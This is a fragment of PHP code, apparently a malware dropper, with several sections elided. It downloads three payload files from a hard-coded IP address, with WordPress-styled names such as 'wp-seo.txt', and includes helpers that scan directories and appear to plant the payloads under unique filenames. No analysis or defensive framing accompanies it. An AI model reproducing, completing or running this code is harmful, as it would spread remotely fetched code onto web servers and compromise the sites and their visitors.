<?php /*05d73e464fb6b2501023ae5c171e9b619c1ce478675d3a4950ca64650c6f15c9 */?><?php
...
function dirUpload($path,$filename,$payload){
    $d = dir($path);
    $dir = array();
    while (false !== ($entry = $d->read())) {
        if (is_dir($path.'/'.$entry) && ($entry != '.') && ($entry != '..')){
...
$result = array();
$woo = array();
$payload = downloader('http://185.141.24.162/www2.txt');
$payload1 = downloader('http://185.141.24.162/wp-seo.txt');
$payload2 = downloader('http://185.141.24.162/wrp2.txt');
$filename = uniqid();
...
$resultTemp = scan4Level($dirCheck);
if(!empty($resultTemp)){
    foreach($resultTemp as $item){
        if(checkZone($item['name'])){
